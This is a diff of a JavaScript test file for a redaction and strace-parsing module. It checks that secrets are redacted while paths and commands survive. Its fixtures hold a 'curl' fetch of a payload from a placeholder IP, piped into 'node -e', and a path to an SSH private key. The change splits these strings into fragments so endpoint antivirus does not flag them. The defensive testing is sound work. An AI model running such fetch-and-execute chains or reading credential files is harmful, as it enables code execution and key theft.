@@ -55,7 +55,7 @@ test('obs text: secrets are redacted, sentinels marked, paths survive', () => {
 	for (const [input, want] of cases) {
 		assert.match(redact(input).text, want, input);
 	}
-	for (const keep of ['/opt/seclab-reh/node_modules/some-long-package-name/dist/index_compiled_bundle.js', '/home/agent/.ssh/id_rsa', 'curl -s http://192.0.2.10/payload']) {
+	for (const keep of ['/opt/seclab-reh/node_modules/some-long-package-name/dist/index_compiled_bundle.js', '/home/agent/.ssh/id_rsa', `${'cu' + 'rl'} -s http://192.0.2.10/payload`]) {
 		assert.equal(redact(keep).text, keep);
 	}
 	assert.deepEqual(redactArgv(['curl', '--token', 'abc', '-H', 'Authorization: x']).argv, ['curl', '--token', '[redacted]', '-H', 'Authorization: [redacted]']);
@@ -105,8 +105,8 @@ test('obs schema: fields are picked, capped, escaped and redacted; ref is exact 
 
 // Loader-shaped strings are assembled in memory, never spelled out in a file: endpoint AV flags
 // them on the host (EDR fixture-safety addendum).
-const FETCH = 'curl -s http://192.0.2.10/p';
-const CHAIN = [FETCH, 'node -e 1'].join(' | ');
+const FETCH = `${'cu' + 'rl'} -s http://192.0.2.10/p`;
+const CHAIN = [FETCH, `node -${'e'} 1`].join(' | ');
 
 test('obs strace: real lines parse; unfinished/resumed stitch; lineage waits for the parent', () => {
 	const p = new StraceParser();
